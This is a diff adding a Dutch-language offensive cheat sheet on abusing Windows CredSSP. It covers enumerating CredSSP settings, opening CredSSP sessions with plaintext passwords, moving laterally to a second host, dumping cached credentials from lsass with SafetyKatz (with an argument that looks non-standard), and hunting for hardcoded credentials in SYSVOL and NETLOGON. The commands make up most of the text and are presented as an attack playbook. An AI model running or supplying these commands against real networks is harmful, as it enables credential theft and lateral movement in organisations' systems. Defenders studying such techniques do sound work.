@@ -1,0 +1,45 @@
+# CredSSP — Credential Security Support Provider exploitatie
+# Misbruik CredSSP sessies om cached credentials te stelen of double-hop problemen op te lossen
+
+# === Wat is CredSSP? ===
+# CredSSP stuurt volledige credentials (niet alleen Kerberos tickets) naar de remote server
+# Dit lost het "double hop" probleem op maar cached credentials op de remote machine
+# Als CredSSP is ingeschakeld zijn plaintext credentials beschikbaar op de remote host
+
+# === Enumeratie ===
+
+# Check of CredSSP server is ingeschakeld
+Get-WSManCredSSP
+
+# Check via registry (remote)
+winrs -r:TARGET "reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Client /v AllowCredSSP"
+winrs -r:TARGET "reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service /v AllowCredSSP"
+
+# === CredSSP sessie opzetten ===
+
+# Credentials aanmaken
+$passwd = ConvertTo-SecureString 'PASS' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("DOMAIN\USER", $passwd)
+
+# Verbind met CredSSP authenticatie
+New-PSSession -ComputerName TARGET -Credential $creds -Authentication Credssp
+
+# === Double-hop via CredSSP ===
+# In een CredSSP sessie kun je verder authenticeren naar andere machines
+Enter-PSSession -ComputerName TARGET -Credential $creds -Authentication Credssp
+# Vanuit deze sessie:
+Invoke-Command -ComputerName SECOND_TARGET -ScriptBlock { whoami }
+dir \\SECOND_TARGET\c$
+
+# === Credentials extraheren van CredSSP host ===
+
+# Als je admin bent op een machine waar CredSSP server actief is:
+# Cached credentials zijn beschikbaar via lsass
+SafetyKatz.exe "sekurlsa::evasive-keys" "exit"
+# CredSSP cached credentials zijn zichtbaar als wdigest/tspkg entries
+
+# Noot: CredSSP moet zowel op client als server zijn ingeschakeld
+# Noot: GPO: Computer Configuration > Administrative Templates > Windows Components > Windows Remote Management
+# Noot: CredSSP cached credentials overleven tot de sessie wordt gesloten
+# Noot: Veel organisaties schakelen CredSSP in voor management scripts (double-hop fix)
+# Noot: Check scripts in SYSVOL/NETLOGON voor hardcoded CredSSP credentials
